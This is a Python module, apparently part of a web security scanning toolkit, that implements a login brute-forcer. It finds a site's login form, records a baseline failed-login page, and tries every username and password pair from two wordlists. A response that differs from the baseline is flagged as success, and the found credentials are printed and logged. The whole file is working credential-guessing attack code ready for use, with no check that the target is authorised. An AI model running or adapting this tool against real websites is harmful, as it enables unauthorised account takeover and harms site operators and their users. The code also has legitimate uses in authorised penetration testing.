import random
import string
import difflib
from urllib.parse import urljoin
from utils.http_client import HttpClient
from utils.reporter import Reporter
from utils.form_parser import get_forms


class LoginBruteforcer:
    def __init__(self, http_client: HttpClient, reporter: Reporter, config: dict):
        self.client = http_client
        self.reporter = reporter
        self.form_page_url = config['url']  #The URL where the form is located
        self.user_param_name = config.get('user_param')
        self.pass_param_name = config.get('pass_param')
        self.action_url = None  #The URL where we will submit the data
        self.USERNAME_KEYWORDS = ['user', 'login', 'email', 'uname', 'username', 'log']
        self.SIMILARITY_THRESHOLD = 0.95

    def initialize(self):
        """
        Finds the login form, its action URL, and field names.
        This must be called before running the attack.
        """
        print("[*] Initializing bruteforcer: finding login form and action URL...")
        forms = get_forms(self.client, self.form_page_url)
        if not forms:
            print("❌ No forms found on the page.")
            return False

        for form in forms:
            pass_field, user_field = None, None
            for field in form['inputs']:
                if field.get('type') == 'password':
                    pass_field = field.get('name')
                    break
            if pass_field:
                for field in form['inputs']:
                    field_name = field.get('name')
                    if field.get('type') in ['text', 'email'] or not field.get('type'):
                        if field_name and any(keyword in field_name.lower() for keyword in self.USERNAME_KEYWORDS):
                            user_field = field_name

                            self.action_url = form['action']
                            self.user_param_name = self.user_param_name or user_field
                            self.pass_param_name = self.pass_param_name or pass_field
                            print(f"[*] Form found! Submitting to: {self.action_url}")
                            print(
                                f"[*] Using User Param: '{self.user_param_name}', Pass Param: '{self.pass_param_name}'")
                            return True

        print("❌ Could not auto-discover a likely login form.")
        return False

    def _get_failure_baseline_content(self):
        """Gets the content of a failed login attempt by submitting to the correct action_url."""
        print("[*] Establishing a failure baseline...")
        random_user = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
        random_pass = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
        payload = {self.user_param_name: random_user, self.pass_param_name: random_pass}

        try:
            #submit to the action url, not the form url
            response = self.client.session.post(self.action_url, data=payload)
            print(f"[*] Baseline established. Failure page content captured.")
            return response.text
        except Exception as e:
            print(f"[!] Critical error while establishing baseline: {e}")
            return None

    def _try_login(self, username, password, baseline_html):
        """Attempts a login and compares the response content to the baseline."""
        payload = {self.user_param_name: username, self.pass_param_name: password}
        try:
            #submit to the action url
            response = self.client.session.post(self.action_url, data=payload)
            similarity_ratio = difflib.SequenceMatcher(a=baseline_html, b=response.text).ratio()
            if similarity_ratio < self.SIMILARITY_THRESHOLD:
                return True
        except Exception:
            pass
        return False

    def run_attack(self, user_list_path, pass_list_path):
        """Runs the brute-force attack."""
        if not self.initialize():
            return None  #Abort if we couldn't find the form details

        baseline_html = self._get_failure_baseline_content()
        if baseline_html is None: return None

        #Load wordlists
        try:
            with open(user_list_path, 'r') as f:
                usernames = [line.strip() for line in f]
            with open(pass_list_path, 'r') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError as e:
            print(f"❌ ERROR: Could not find wordlist file: {e}")
            return None

        print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
        print(f"[*] Total attempts to make: {len(usernames) * len(passwords)}")

        for username in usernames:
            for password in passwords:
                print(f"[*] Trying: {username}:{password}", end='\r')
                if self._try_login(username, password, baseline_html):
                    success_message = f"\n✅ SUCCESS (CONTENT ANOMALY)! Potential credentials: {username}:{password}"
                    print(success_message, " " * 20)
                    self.reporter.log_raw('login_bruteforcer', {"found_credentials": success_message})
                    return (username, password)

        print(f"\n[-] Brute-force attack finished. No credentials found.")
        return None